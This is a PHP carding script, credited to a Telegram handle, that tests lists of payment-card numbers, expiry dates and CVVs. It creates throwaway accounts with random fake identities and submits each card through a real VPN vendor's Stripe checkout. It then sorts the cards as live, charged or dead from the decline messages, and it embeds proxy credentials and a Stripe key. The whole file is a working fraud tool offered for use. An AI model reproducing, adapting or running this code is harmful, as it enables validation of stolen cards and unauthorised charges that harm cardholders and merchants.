<?php

$MADEBY = '<a href="https://t.me/DarkTemptation21">『⫸FIRE⫷』</a>';

//================[Functions and Variables]================//
//error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function get_string_between($string, $start, $end){
	$string = " ".$string;
	$ini = strpos($string,$start);
	if ($ini == 0) return "";
	$ini += strlen($start);   
	$len = strpos($string,$end,$ini) - $ini;
	return substr($string,$ini,$len);
}

function pre_r($array){
    echo "<pre>";
    print_r($array);
    echo "</pre>";
}
//================[Functions and Variables]================//

//==================[Randomizing Details]======================//

$clettersArray = str_split('ABCDEFGHIJKLMNOPQRSTUVWXYZ');
$slettersArray = str_split('abcdefghijklmnopqrstuvwxyz');
$lettersArray = str_split('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890');
$fname = $clettersArray[array_rand($clettersArray)];
$lname = $clettersArray[array_rand($clettersArray)];
for($i=0; $i<4; $i++){
    $fname .= $slettersArray[array_rand($slettersArray)];
    $lname .= $slettersArray[array_rand($slettersArray)];
}
$email = $fname.$lname.rand(10,99).'@gmail.com';
$password = '';
for($i=0; $i<16; $i++){
    $password .= $lettersArray[array_rand($lettersArray)];
}
$zip = rand(10000,99999);
$useragent = 'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'';
//==================[End Randomizing Details]======================//

//==================[Proxy setup]======================//
$proxyPasses = array(
    'dhssccps-rotate:rn6q65ufxqsl',
    'eciultpq-rotate:21no8en4737j'
);
//==================[End Proxy setup]======================//

//==================[REQ1]======================//
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPasses[array_rand($proxyPasses)]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER['REQUEST_URI']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_ENCODING,  '');
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_URL, 'https://my.hide-my-ip.com/cart.php?a=checkout');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'user-agent: '.$useragent
));


$result1 = curl_exec($ch);
$csrf = get_string_between($result1, "var csrfToken = '", "'");
//==================[END REQ1]======================//

//==================[REQ2]======================//
curl_setopt($ch, CURLOPT_URL, 'https://my.hide-my-ip.com/cart.php?a=add&pid=2&billingcycle=monthly&skipconfig=1');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: '.$useragent
));
$result2 = curl_exec($ch);

//==================[END REQ2]======================//

//==================[REQ3]======================//
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'user-agent: '.$useragent
));
curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&key=pk_uZznk5GlIWsJDPVb9SIaAK1BOF2ov");
$result3 = curl_exec($ch);
$pmid = get_string_between($result3, '"id": "', '"');
//==================[END REQ3]======================//

//==================[REQ4]======================//
curl_setopt($ch, CURLOPT_URL, 'https://my.hide-my-ip.com/index.php?rp=/stripe/payment/intent');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'user-agent: '.$useragent
));
curl_setopt($ch, CURLOPT_POSTFIELDS, "token=$csrf&submit=true&custtype=new&licenseKey=&loginemail=&loginpassword=&country-calling-code-phonenumber=1&phonenumber=&email=$email&fullname=$fname+$lname&password=$password&address1=548+Hillcrest&firstname=$fname&lastname=$lname&companyname=&password2=$password&address2=&city=New+York&state=NY&postcode=$zip&none1=&country=US&paymentmethod=stripe&ccinfo=new&ccdescription=&accepttos=on&payment_method_id=$pmid");
$result4 = curl_exec($ch);
$message = get_string_between($result4, 'feedback":"', '"');
$message = urldecode($message);
curl_close($ch);
//==================[END REQ4]======================//

//==================[Results]======================//
if(strpos($result4, 'card\u0027s security code is incorrect.')||strpos($result4, "card's security code is incorrect.")){
    echo '<span class="badge bg-warning">#CCN ✓ </span> '.$lista.' ↬ '.$message.' ↬ Checker by '.$MADEBY;
}
elseif(strpos($result4, 'card was declined.') || strpos($result4, 'card number is incorrect.') || strpos($result4, 'card does not support this type of purchase.') || strpos($result4, 'card has expired.')){
    echo '<span class="badge bg-danger">#DEAD </span> '.$lista.' ↬ '.$message.' ↬ Checker by '.$MADEBY;
}
elseif(strpos($result4, 'card_error_authentication_required')){
    echo '<span class="badge bg-danger">#DEAD </span> '.$lista.' ↬ 3D-Secure ↬ Checker by '.$MADEBY;
}
elseif(strpos($result4, '"success":true')){
    echo '<span class="badge bg-success">#CVV </span> '.$lista.'<br> ↬ CHARGED 5$<br> ↬ Checker by '.$MADEBY;
}
elseif(strpos($result4, 'Your card has insufficient funds.')){
    echo '<span class="badge bg-success">#CVV </span> '.$lista.' ↬ Your card has insufficient funds. ↬ Checker by '.$MADEBY;
}elseif(strpos($result4, 'Invalid or Missing Payment Information')){
    echo '<span class="badge bg-success">#UNKNOWN </span> '.$lista.' ↬ Unknown Error Occured ↬ Checker by '.$MADEBY;
}


//==================[END Results]======================//

echo '<br>'.$message;

ob_flush();





?>